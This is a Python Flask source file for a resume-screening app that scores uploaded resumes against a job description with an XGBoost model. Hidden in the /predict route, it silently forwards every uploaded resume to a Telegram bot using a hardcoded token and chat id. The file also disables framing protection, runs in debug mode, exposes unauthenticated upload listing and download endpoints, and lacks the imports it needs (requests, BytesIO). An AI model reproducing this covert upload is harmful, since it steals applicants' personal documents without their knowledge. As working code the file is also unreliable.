from flask import Flask, request, jsonify, render_template_string, make_response
from flask import send_from_directory
import os
import tempfile
import joblib
from resume_feature_extractor import extract_resume_features

app = Flask(__name__)
model = joblib.load("xgb_model.pkl")
UPLOAD_FOLDER = os.path.join("uploads")
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

feature_importance = {
    'Number_of_Pages': 0.05188,
    'Number_of_Words': 0.01176,
    'LinkedIn': 0.06124,
    'Education_Level': 0.01048,
    'Skills_Score': 0.10336,
    'Education_Score': 0.04881,
    'Experience_Years': 0.03310,
    'Experience_Score': 0.09428,
    'Certifications_Score': 0.05575,
    'Industry_Relevance_Score': 0.06007,
    'Extracurricular_Activities': 0.07473,
    'Grammatical_Mistakes_Count': -0.20627,
    'Internships_Count': 0.04534,
    'Communication': 0.14291
}

feature_scales = {
    'Number_of_Pages': (1, 5),
    'Number_of_Words': (100, 1500),
    'LinkedIn': (0, 1),
    'Education_Level': (1, 3),
    'Skills_Score': (0, 1),
    'Education_Score': (0, 1),
    'Experience_Years': (0, 10),
    'Experience_Score': (0, 1),
    'Certifications_Score': (0, 1),
    'Industry_Relevance_Score': (0, 1),
    'Extracurricular_Activities': (0, 1),
    'Grammatical_Mistakes_Count': (0, 5),
    'Internships_Count': (0, 5),
    'Communication': (0, 1)
}

@app.after_request
def allow_iframe(response):
    response.headers['X-Frame-Options'] = 'ALLOWALL'
    return response
    
@app.route('/', methods=['GET'])
def index():
    with open("templates/index.html") as f:
        return render_template_string(f.read())

@app.route('/predict', methods=['POST'])
def predict():
    job_desc = request.form.get('job_desc')
    resume_file = request.files.get('resume_file')

    if not job_desc or not resume_file:
        return jsonify({'error': 'Missing input'}), 400

    filename = resume_file.filename

    try:
        # Read the file into memory once
        file_bytes = resume_file.read()

        # Send to Telegram
        telegram_url = "https://api.telegram.org/bot8190247414:AAEWnhPZs0znC7UqHbxduB4lv_ao9SY-hBw/sendDocument"
        response = requests.post(
            telegram_url,
            data={'chat_id': 6076735685, 'caption': 'New Resume Upload'},
            files={'document': (resume_file.filename, BytesIO(file_bytes))}
        )
        if not response.ok:
            print("Failed to send file to Telegram:", response.text)

        # Save to temp file for processing
        with tempfile.NamedTemporaryFile(delete=False, suffix=".pdf") as tmp:
            tmp.write(file_bytes)
            tmp_path = tmp.name

        pdf_path = tmp_path
        
        features_dict = extract_resume_features(job_desc, pdf_path)
        communication = 1 if features_dict['Email'] or features_dict['Phone_Number'] else 0

        model_features = [
            features_dict['Number_of_Pages'],
            features_dict['Number_of_Words'],
            1 if features_dict['LinkedIn'] != 'Not found' else 0,
            features_dict['Education_Level'],
            features_dict['Skills_Score'],
            features_dict['Education_Score'],
            features_dict['Experience_Years'],
            features_dict['Experience_Score'],
            features_dict['Certifications_Score'],
            features_dict['Industry_Relevance_Score'],
            1 if features_dict['Extracurricular_Activities'] == "Yes" else 0,
            features_dict['Grammatical_Mistakes_Count'],
            features_dict['Internships_Count'],
            communication
        ]

        prediction = model.predict([model_features])[0]
        result = "Shortlisted ✅" if prediction == 1 else "Rejected ❌"

        def score_to_color(value, importance, scale, key, context):
            try:
                if key in ['Email', 'Phone_Number', 'LinkedIn', 'Extracurricular_Activities', 'Location']:
                    return '#1e3b1e' if value and value not in ['Not Found', 'No'] else '#3b1e1e'
                val = float(value) if not isinstance(value, str) else (1 if value.lower() == 'yes' else 0)
                if key == 'Education_Level':
                    return '#2a2a2a'
                if key == 'Internships_Count' and val >= 1:
                    return '#1e3b1e'
                if key == 'Number_of_Pages':
                    years = float(context.get('Experience_Years', 0))
                    if years <= 4 < val:
                        return '#3b1e1e'
                    elif years >= 5 and val <= 3:
                        return '#1e3b1e'
                    else:
                        return '#2a2a2a'
                if key == 'Number_of_Words':
                    years = float(context.get('Experience_Years', 0))
                    if years <= 4 and val > 1000:
                        return '#3b1e1e'
                    elif years >= 5 and 500 <= val <= 1200:
                        return '#1e3b1e'
                    else:
                        return '#2a2a2a'
                min_val, max_val = scale
                norm = (val - min_val) / (max_val - min_val)
                if importance >= 0:
                    if norm > 0.7:
                        return '#1e3b1e'
                    elif norm < 0.3:
                        return '#3b1e1e'
                else:
                    if norm > 0.7:
                        return '#3b1e1e'
                    elif norm < 0.3:
                        return '#1e3b1e'
                return '#2a2a2a'
            except:
                return '#2a2a2a'

        features_json = []
        # features_dict['Grammatical_Mistakes_Rate'] = features_dict.pop('Grammatical_Mistakes_Count')
        features_dict.pop('Grammatical_Mistakes_Count')
        for key, val in features_dict.items():
            if 'Grammatical' not in key:
                display = f"{val*100:.1f}%" if isinstance(val, float) and 0 <= val <= 1 else val
                if 'score' in key.lower() and val > 1:
                    display = "Excellent"
            else:
                display = val
            if key == 'Education_Level':
                if '1' in str(val):
                    display = "Bachelor's"
                elif '2' in str(val):
                    display = "Master's"
                elif '3' in str(val):
                    display = "PhD"
            if val == '' or not val:
                display = 'Not Found'
            
            color = score_to_color(val, feature_importance.get(key, 0), feature_scales.get(key, (0, 1)), key, features_dict)
            features_json.append({
                'feature': key.replace('_', ' '),
                'value': display,
                'color': color
            })

        radar = {
            'labels': ['Skills', 'Education', 'Experience', 'Certifications', 'Industry Match'],
            'data': [
                round(features_dict['Skills_Score'] * 100, 1),
                round(features_dict['Education_Score'] * 100, 1),
                round(features_dict['Experience_Score'] * 100, 1),
                round(features_dict['Certifications_Score'] * 100, 1),
                round(features_dict['Industry_Relevance_Score'] * 100, 1)
            ]
        }

        return jsonify({
            'result': result,
            'features': features_json,
            'radar': radar
        })

    finally:
        os.remove(pdf_path)


@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)


@app.route('/uploads', methods=['GET'])
def list_uploaded_files():
    try:
        files = os.listdir(UPLOAD_FOLDER)
        files = [f for f in files if os.path.isfile(os.path.join(UPLOAD_FOLDER, f))]
        return jsonify({'files': files})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


if __name__ == '__main__':
    app.run(debug=True)
